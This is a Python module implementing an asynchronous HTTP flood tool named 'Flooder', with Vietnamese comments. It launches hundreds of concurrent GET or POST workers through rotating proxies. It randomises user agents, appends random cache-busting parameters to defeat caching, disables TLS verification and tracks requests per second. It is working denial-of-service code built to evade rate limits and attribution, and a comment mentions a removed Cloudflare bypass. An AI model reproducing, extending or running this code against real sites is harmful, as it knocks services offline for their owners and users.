import asyncio
import random
import string
import time
from dataclasses import dataclass, field

import httpx

from .proxy_manager import ProxyManager


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
]


def rand_string(n=8):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


@dataclass
class Stats:
    sent: int = 0
    ok: int = 0
    fail: int = 0
    bytes_recv: int = 0
    start: float = field(default_factory=time.time)

    def rps(self):
        e = time.time() - self.start
        return self.sent / e if e > 0 else 0.0

    def report(self):
        e = time.time() - self.start
        return (f"[{e:6.1f}s] sent={self.sent:>8} ok={self.ok:>8} "
                f"fail={self.fail:>7} rps={self.rps():>7.1f} "
                f"recv={self.bytes_recv/1024/1024:.1f}MB")


class Flooder:
    def __init__(self, target: str, proxies: ProxyManager,
                 method="GET", threads=200, rps_limit=0): # Đã xóa use_cf_bypass
        self.target = target
        self.proxies = proxies
        self.method = method.upper()
        self.threads = threads
        self.rps_limit = rps_limit
        self.stats = Stats()
        self._stop = asyncio.Event()

    def stop(self):
        self._stop.set()

    def _cache_buster(self):
        sep = "&" if "?" in self.target else "?"
        return f"{self.target}{sep}{rand_string(12)}={rand_string(16)}"

    async def _httpx_worker(self, wid: int):
        while not self._stop.is_set():
            proxy = await self.proxies.get()
            if proxy is None:
                await asyncio.sleep(0.5)
                continue
            url = self._cache_buster()
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Referer": self.target,
                "Connection": "keep-alive",
            }
            try:
                async with httpx.AsyncClient(
                    proxy=proxy.url(), timeout=httpx.Timeout(5.0),
                    http2=True, verify=False,
                ) as c:
                    if self.method == "GET":
                        r = await c.get(url, headers=headers)
                    else:
                        r = await c.post(url, headers=headers, content=rand_string(64))
                    self.stats.ok += 1
                    self.stats.bytes_recv += len(r.content)
                    self.proxies.mark_ok(proxy)
            except Exception:
                self.stats.fail += 1
                self.proxies.mark_fail(proxy)
            finally:
                self.stats.sent += 1
            if self.rps_limit > 0:
                await asyncio.sleep(1.0 / self.rps_limit)

    async def run(self, duration: int = 0):
        # Chỉ còn 1 loại worker là httpx
        workers = [asyncio.create_task(self._httpx_worker(i)) for i in range(self.threads)]

        async def reporter():
            # Bỏ phần in ra console vì main.py đã dùng Rich UI để vẽ
            while not self._stop.is_set():
                await asyncio.sleep(1)

        rep = asyncio.create_task(reporter())

        if duration > 0:
            try:
                await asyncio.wait_for(self._stop.wait(), timeout=duration)
            except asyncio.TimeoutError:
                self._stop.set()
        else:
            await self._stop.wait()

        rep.cancel()
        for w in workers:
            w.cancel()